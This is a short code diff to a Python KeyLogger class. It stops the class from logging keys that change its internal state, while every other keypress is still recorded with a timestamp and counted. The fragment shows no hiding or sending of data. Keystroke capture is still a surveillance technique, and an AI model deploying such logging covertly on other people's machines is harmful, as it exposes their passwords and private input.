@@ -28,9 +28,9 @@ class KeyLogger:
             self.a_stopMain = False
         if(p_key in self.a_find_state.keys()):
             self.a_state=self.a_find_state[p_key]
-
-        log = ( datetime.now().time(), p_key )
-        self.a_keys.append(log)
+        else:
+            log = ( datetime.now().time(), p_key )
+            self.a_keys.append(log)
     
     def CountKey(self):
         """Return the number of keys pressed."""
